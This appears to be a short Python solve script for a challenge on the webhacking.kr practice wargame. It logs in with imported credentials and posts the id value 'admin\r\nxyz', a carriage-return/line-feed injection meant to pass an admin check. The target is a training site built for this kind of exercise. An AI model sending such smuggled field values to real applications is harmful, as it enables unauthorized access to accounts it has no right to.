import requests
from login import *

s = requests.Session()

def getCaptcha(text):
    i = text.find("value=")
    return text[i+7:i+17]

# Login webhacking.kr
s.post("https://webhacking.kr/login.php?login", data={"id":webhacking_id, "pw":webhacking_pw})
r2 = s.post("https://webhacking.kr/challenge/bonus-9/index.php", data={"id":"admin\r\nxyz"})
s.close()
#print(r2.text)